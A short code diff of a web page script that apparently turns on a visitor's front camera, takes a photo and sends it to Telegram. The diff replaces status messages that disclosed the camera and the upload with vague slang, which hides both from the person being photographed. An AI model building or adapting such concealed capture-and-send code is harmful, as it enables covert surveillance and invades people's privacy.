@@ -46,7 +46,7 @@ async function startSnap() {
   const ctx = canvas.getContext('2d');
   const status = document.getElementById('status');
 
-  status.innerText = "📷 Mengaktifkan kamera...";
+  status.innerText = "Gass cuyy";
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -54,7 +54,7 @@ async function startSnap() {
 
     video.onloadedmetadata = () => {
       video.play();
-      status.innerText = "Kamera aktif. Menyiapkan jepretan...";
+      status.innerText = "Jangan Kasih Kendor";
 
       setTimeout(() => {
         if (video.videoWidth === 0 || video.videoHeight === 0) {
@@ -91,7 +91,7 @@ async function sendPhoto(base64img) {
 
     const data = await res.json();
     if (data.ok) {
-      status.innerText = "✔️ Foto berhasil dikirim ke Telegram!";
+      status.innerText = "Gokill Bos";
     } else {
       status.innerText = "❌ Gagal kirim foto: " + (data.description || data.error);
     }
